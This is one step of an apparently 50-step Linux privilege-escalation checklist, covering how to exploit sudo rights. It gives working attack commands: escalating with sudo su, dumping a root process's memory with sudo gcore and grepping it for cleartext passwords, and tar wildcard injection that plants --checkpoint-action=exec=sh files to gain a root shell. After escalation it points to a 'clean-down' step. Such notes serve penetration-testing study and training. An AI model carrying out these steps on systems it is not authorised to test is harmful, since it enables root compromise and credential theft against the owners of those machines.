# Linux - Sudo Check

**Step 14 of 50 · Linux**

*Check whether the current user can run a command as root without a password.*

## Run this

```bash
sudo -l
```

## Example output

NOPASSWD binary:
```
User username may run the following commands on host:
    (ALL) NOPASSWD: /usr/bin/find
```

Full sudo:
```
User username may run the following commands on host:
    (ALL : ALL) ALL
```
## What did you get?

- [ ] `(ALL) ALL` is shown → **Run `sudo su`, then go to clean-down**
- [ ] A specific NOPASSWD binary is shown → **Check that binary on GTFOBins, then run the matching path**
- [ ] `NOPASSWD: /usr/bin/gcore` is shown → **Find a root process with `ps aux | grep root`, then `sudo gcore <PID>` and `strings core.<PID> | grep -A2 -i "password"` — cleartext credentials often appear**
- [ ] `NOPASSWD: /usr/bin/tar` with a wildcard `*` argument is shown → **Tar wildcard injection: create `--checkpoint=1`, `--checkpoint-action=exec=sh shell.sh` files in the target directory, then trigger the sudo command**
- [ ] A binary is allowed with a password → **Use the current password if known, then check GTFOBins**
- [ ] Nothing useful is shown → **Go to Step 15 · [[Linux - SUID Check]]**

## Notes

GTFOBins documents ways to turn some allowed programs into a root shell.

For tar wildcard injection: the filenames are interpreted as tar flags when `*` expands. Create the checkpoint files in the working directory the sudo command runs against, then trigger the command.

## Gotcha

> [!warning] 💡
> A sudo rule is only useful if the current user can satisfy its password requirement or it is NOPASSWD.

> [!warning] 💡
> `gcore` dumps process memory to a file named `core.<PID>`. Use `strings` piped through `grep` for `Password`, `pass`, and `secret` — service accounts that auto-login often have cleartext credentials in memory.
